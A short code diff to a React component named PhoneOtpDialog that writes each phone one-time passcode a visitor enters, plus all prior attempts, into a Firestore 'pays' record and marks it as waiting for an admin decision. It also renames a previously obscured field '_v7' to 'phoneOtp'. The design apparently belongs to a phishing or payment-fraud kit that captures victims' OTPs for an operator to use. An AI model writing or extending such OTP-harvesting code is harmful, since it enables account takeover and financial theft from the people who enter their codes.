@@ -127,7 +127,7 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, onRejected }: 
 
       // Save OTP to Firebase
       await updateDoc(doc(db, "pays", visitorID), {
-        _v7: otp,
+        phoneOtp: otp,
         phoneOtpSubmittedAt: new Date().toISOString(),
         allPhoneOtps: allOtps.current,
         phoneOtpStatus: "verifying", // Set to verifying, waiting for admin decision
@@ -136,7 +136,7 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, onRejected }: 
 
       // Add phone OTP to history
       await addToHistory(visitorID, "phone_otp", {
-        _v7: otp
+        phoneOtp: otp
       }, "pending")
 
       console.log("[PhoneOTP] OTP submitted, waiting for admin decision")
